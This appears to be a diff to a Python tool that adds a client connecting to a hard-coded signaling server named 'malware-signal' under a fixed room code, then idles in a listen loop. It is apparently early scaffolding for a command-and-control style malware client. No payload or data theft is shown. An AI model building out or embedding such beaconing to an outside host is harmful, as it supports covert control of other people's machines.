@@ -1,10 +1,32 @@
 import asyncio
+import uuid
+
 import sys
 import helper as h
 import version as v
 
-def listen_mode():
+from signaling.signal import SignalClient
+
+
+
+HOST = "https://malware-signal.vercel.app/"
+ROOM = "D4RKGLI7CH"
+
+user_id = uuid.uuid4()
+
+
+async def listen_mode():
     print("listen mode")
+
+    signal = SignalClient(ROOM, user_id, HOST)
+
+    await signal.connect()
+
+    print(f"[+] Listening as {user_id}")
+
+    while True:
+        await asyncio.sleep(1)
+
 
 def online_list_mode():
     print("online list mode")
